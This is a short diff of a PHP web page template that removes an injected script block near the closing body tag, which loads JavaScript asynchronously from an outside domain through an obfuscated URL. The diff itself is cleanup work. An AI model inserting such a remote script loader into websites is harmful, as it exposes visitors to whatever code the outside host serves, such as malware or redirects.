@@ -299,17 +299,6 @@ $domain = $_SERVER['SERVER_NAME'];
 			</div>
 		</div>
 	</section>
-	<script>
-(function(bnfhwn){
-var d = document,
-    s = d.createElement('script'),
-    l = d.scripts[d.scripts.length - 1];
-s.settings = bnfhwn || {};
-s.src = "\/\/wretched-application.com\/c\/D.9-6Xb\/2p5zlySgWQQe9TNOTaIo3qMmjLAs0jMkiq0E1OM\/jcc\/y\/MzDkQozK";
-s.async = true;
-l.parentNode.insertBefore(s, l);
-})({})
-</script>
 </body>
 
 </html>
